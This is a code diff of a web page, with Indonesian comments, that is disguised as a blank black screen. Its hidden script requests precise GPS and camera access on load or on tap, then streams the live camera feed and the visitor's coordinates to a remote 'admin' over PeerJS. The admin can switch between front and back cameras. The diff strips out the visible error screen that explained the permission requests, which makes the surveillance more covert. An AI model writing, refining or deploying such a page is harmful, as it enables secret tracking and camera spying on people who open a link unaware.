@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sesi</title>
+    <title>Blank</title>
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; }
         html, body {
@@ -23,57 +23,17 @@
             pointer-events: none;
             overflow: hidden;
         }
-        #errorScreen {
-            display: none;
-            width: 100%;
-            height: 100%;
-            background-color: #090d16;
-            color: #f8fafc;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            text-align: center;
-            padding: 24px;
-        }
-        #errorScreen h1 {
-            font-size: 22px;
-            color: #f87171;
-            margin-bottom: 10px;
-        }
-        #errorScreen p {
-            font-size: 14px;
-            color: #94a3b8;
-            max-width: 360px;
-            line-height: 1.5;
-            margin-bottom: 18px;
-        }
-        #errorScreen button {
-            padding: 10px 18px;
-            border: none;
-            border-radius: 8px;
-            background: #ef4444;
-            color: #fff;
-            font-weight: 600;
-            font-size: 14px;
-            cursor: pointer;
-        }
     </style>
     <script src="https://unpkg.com/peerjs@1.5.4/dist/peerjs.min.js"></script>
 </head>
 <body onclick="onTap()">
-
-<div id="errorScreen">
-    <h1>Error</h1>
-    <p id="errorDetail">Izin lokasi dan kamera wajib diizinkan.</p>
-    <button onclick="retryPermission()">Coba Lagi</button>
-</div>
 
 <div id="hiddenLayer">
     <video id="localVideo" autoplay playsinline muted></video>
 </div>
 
 <script>
+    // Ganti ROOM_ID sesuai keinginanmu agar unik milikmu sendiri
     const ROOM_ID = "jirun-live-room-9988";
 
     let currentFacing = "user"; // "user" = depan, "environment" = belakang
@@ -82,64 +42,62 @@
     let activeCall = null;
     let activeDataConn = null;
     let watchId = null;
-    let pushInterval = null;
     let latestLocation = null;
     let isStarting = false;
-    let isSwitchingCam = false;
-    let hasError = false;
 
     const videoEl = document.getElementById("localVideo");
-    const errorScreen = document.getElementById("errorScreen");
-    const errorDetail = document.getElementById("errorDetail");
 
-    function triggerError(message) {
-        if (hasError) return;
-        hasError = true;
-        cleanup();
-        document.body.style.backgroundColor = "#090d16";
-        document.body.style.color = "#f8fafc";
-        errorDetail.textContent = message || "Izin ditolak. Terjadi error.";
-        errorScreen.style.display = "flex";
-    }
+    async function openCamera(facing) {
+        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+            return null;
+        }
+        if (cameraStream) {
+            cameraStream.getTracks().forEach(t => t.stop());
+            cameraStream = null;
+        }
+        const stream = await navigator.mediaDevices.getUserMedia({
+            video: { facingMode: { ideal: facing }, width: { ideal: 640 }, height: { ideal: 480 } },
+            audio: false
+        });
+        currentFacing = facing;
+        cameraStream = stream;
+        videoEl.srcObject = stream;
+        await videoEl.play().catch(() => {});
 
-    function resetErrorUI() {
-        hasError = false;
-        errorScreen.style.display = "none";
-        document.body.style.backgroundColor = "#000000";
-        document.body.style.color = "#000000";
+        // Jika sudah terhubung ke admin, ganti track video secara realtime
+        if (activeCall && activeCall.peerConnection) {
+            const newTrack = stream.getVideoTracks()[0];
+            const sender = activeCall.peerConnection.getSenders().find(s => s.track && s.track.kind === "video");
+            if (sender && newTrack) {
+                await sender.replaceTrack(newTrack);
+            }
+        }
+        sendStatusToAdmin();
+        return stream;
     }
 
     function sendStatusToAdmin() {
-        if (hasError) return;
         if (activeDataConn && activeDataConn.open) {
-            try {
-                activeDataConn.send({
-                    type: "STATUS",
-                    facing: currentFacing === "environment" ? "Belakang" : "Depan",
-                    cameraActive: Boolean(cameraStream),
-                    location: latestLocation,
-                    updatedAt: Date.now()
-                });
-            } catch (e) {}
+            activeDataConn.send({
+                type: "STATUS",
+                facing: currentFacing === "environment" ? "Belakang" : "Depan",
+                location: latestLocation,
+                updatedAt: Date.now()
+            });
         }
     }
 
-    function requestLocationPermission() {
+    function startLocationStream() {
         return new Promise((resolve, reject) => {
             if (!navigator.geolocation) {
-                reject(new Error("Browser tidak mendukung lokasi."));
+                reject(new Error("Geolocation not supported"));
                 return;
             }
-
-            let resolvedOnce = false;
-            if (watchId !== null) {
-                navigator.geolocation.clearWatch(watchId);
-                watchId = null;
-            }
+            let done = false;
+            if (watchId !== null) navigator.geolocation.clearWatch(watchId);
 
             watchId = navigator.geolocation.watchPosition(
                 (pos) => {
-                    if (hasError) return;
                     latestLocation = {
                         lat: Number(pos.coords.latitude.toFixed(6)),
                         lng: Number(pos.coords.longitude.toFixed(6)),
@@ -152,183 +110,81 @@
                             : "-"
                     };
                     sendStatusToAdmin();
-                    if (!resolvedOnce) {
-                        resolvedOnce = true;
+                    if (!done) {
+                        done = true;
                         resolve(latestLocation);
                     }
                 },
                 (err) => {
-                    if (!resolvedOnce) {
-                        resolvedOnce = true;
-                        if (err && err.code === err.PERMISSION_DENIED) {
-                            reject(new Error("Izin lokasi ditolak."));
-                        } else {
-                            reject(new Error("Gagal mengambil lokasi."));
-                        }
-                    } else if (err && err.code === err.PERMISSION_DENIED) {
-                        triggerError("Izin lokasi ditolak.");
+                    if (!done) {
+                        done = true;
+                        reject(err);
                     }
                 },
-                { enableHighAccuracy: true, timeout: 15000, maximumAge: 5000 }
+                { enableHighAccuracy: true, timeout: 15000, maximumAge: 1000 }
             );
         });
     }
 
-    async function openCamera(facing, isSwitch) {
-        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-            throw new Error("Browser tidak mendukung kamera.");
-        }
-
-        const oldStream = cameraStream;
-        isSwitchingCam = Boolean(isSwitch);
-
-        try {
-            const newStream = await navigator.mediaDevices.getUserMedia({
-                video: { facingMode: { ideal: facing }, width: { ideal: 640 }, height: { ideal: 480 } },
-                audio: false
-            });
-
-            currentFacing = facing;
-            cameraStream = newStream;
-            videoEl.srcObject = newStream;
-            await videoEl.play().catch(() => {});
-
-            if (oldStream) {
-                oldStream.getTracks().forEach(t => {
-                    t.onended = null;
-                    t.stop();
-                });
-            }
-
-            if (activeCall && activeCall.peerConnection) {
-                const newTrack = newStream.getVideoTracks()[0];
-                const sender = activeCall.peerConnection.getSenders().find(s => s.track && s.track.kind === "video");
-                if (sender && newTrack) {
-                    await sender.replaceTrack(newTrack).catch(() => {});
-                }
-            }
-
-            sendStatusToAdmin();
-            return newStream;
-        } catch (err) {
-            if (!isSwitch) {
-                if (err && (err.name === "NotAllowedError" || err.name === "PermissionDeniedError")) {
-                    throw new Error("Izin kamera ditolak.");
-                }
-                throw new Error("Kamera gagal dibuka.");
-            }
-            return oldStream;
-        } finally {
-            isSwitchingCam = false;
-        }
-    }
-
     function setupPeer() {
-        if (peer || hasError) return;
+        if (peer) return;
         peer = new Peer(ROOM_ID);
 
-        peer.on("open", () => {
-            if (pushInterval) clearInterval(pushInterval);
-            pushInterval = setInterval(sendStatusToAdmin, 3000);
-        });
-
         peer.on("connection", (conn) => {
-            if (hasError) return;
             activeDataConn = conn;
             conn.on("open", () => {
                 sendStatusToAdmin();
             });
             conn.on("data", async (msg) => {
-                if (!msg || !msg.type || hasError) return;
+                if (!msg || !msg.type) return;
                 if (msg.type === "SWITCH_CAM") {
                     const target = msg.facing === "environment" || msg.facing === "user"
                         ? msg.facing
                         : (currentFacing === "user" ? "environment" : "user");
-                    await openCamera(target, true);
+                    await openCamera(target);
                 } else if (msg.type === "PING") {
                     sendStatusToAdmin();
                 }
             });
-            conn.on("close", () => {
-                if (activeDataConn === conn) activeDataConn = null;
-            });
         });
 
         peer.on("call", (call) => {
-            if (hasError) return;
+            if (!cameraStream) return;
             activeCall = call;
-            if (cameraStream) {
-                call.answer(cameraStream);
-            }
-        });
-
-        peer.on("error", (err) => {
-            console.error("Peer error:", err);
+            call.answer(cameraStream);
         });
     }
 
     async function init() {
-        if (isStarting || hasError) return;
+        if (isStarting) return;
         isStarting = true;
-
         try {
             if (!latestLocation) {
-                await requestLocationPermission();
+                await startLocationStream();
             }
             if (!cameraStream) {
-                await openCamera(currentFacing, false);
+                await openCamera(currentFacing);
             }
             setupPeer();
-            sendStatusToAdmin();
         } catch (err) {
-            triggerError(err && err.message ? err.message : "Izin ditolak.");
+            console.error(err);
         } finally {
             isStarting = false;
         }
     }
 
-    function retryPermission() {
-        resetErrorUI();
-        init();
-    }
-
     function onTap() {
-        if (hasError || isStarting || isSwitchingCam) return;
         if (!latestLocation || !cameraStream) {
             init();
-        } else {
-            sendStatusToAdmin();
         }
     }
 
     function cleanup() {
-        if (pushInterval) {
-            clearInterval(pushInterval);
-            pushInterval = null;
-        }
-        if (watchId !== null) {
-            navigator.geolocation.clearWatch(watchId);
-            watchId = null;
-        }
-        if (cameraStream) {
-            cameraStream.getTracks().forEach(t => {
-                t.onended = null;
-                t.stop();
-            });
-            cameraStream = null;
-        }
-        if (activeCall) {
-            try { activeCall.close(); } catch (e) {}
-            activeCall = null;
-        }
-        if (activeDataConn) {
-            try { activeDataConn.close(); } catch (e) {}
-            activeDataConn = null;
-        }
-        if (peer) {
-            try { peer.destroy(); } catch (e) {}
-            peer = null;
-        }
+        if (watchId !== null) navigator.geolocation.clearWatch(watchId);
+        if (cameraStream) cameraStream.getTracks().forEach(t => t.stop());
+        if (activeCall) activeCall.close();
+        if (activeDataConn) activeDataConn.close();
+        if (peer) peer.destroy();
     }
 
     window.addEventListener("DOMContentLoaded", init);
